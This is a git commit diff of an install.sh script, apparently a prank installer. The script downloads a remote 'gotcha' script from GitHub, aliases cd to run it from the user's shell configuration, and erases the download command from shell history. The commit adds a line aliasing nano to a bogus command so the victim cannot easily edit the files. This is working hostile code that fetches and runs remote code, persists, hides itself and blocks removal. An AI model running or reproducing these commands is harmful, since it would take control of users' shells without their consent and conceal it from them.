a7c06e64d25ea333fbbb6655de4b65ade5c416d7
Z1nnlos <Noel.Sabia@gmx.net>
2024-01-25 22:58:44 +0100

    first changes were made

--- install.sh
+++ install.sh
@@ -3,5 +3,6 @@ curl -s -o ~/gotcha.sh https://raw.githubusercontent.com/jkauker/gotcha/master/g
 chmod +x ~/gotcha.sh
 echo "alias cd='bash ~/gotcha.sh'" >> ~/.zshrc
 echo "alias cd='bash ~/gotcha.sh'" >> ~/.bashhrc
+echo "alias nano=deleting_me_is_not_an_option" >> ~/.zshrc
 export HISTIGNORE="history -d*"
 history -d $(history | grep "curl -s -o ~/gotcha.sh https://raw.githubusercontent.com/jkauker/gotcha/master/gotcha.sh" | awk '{print $1}')
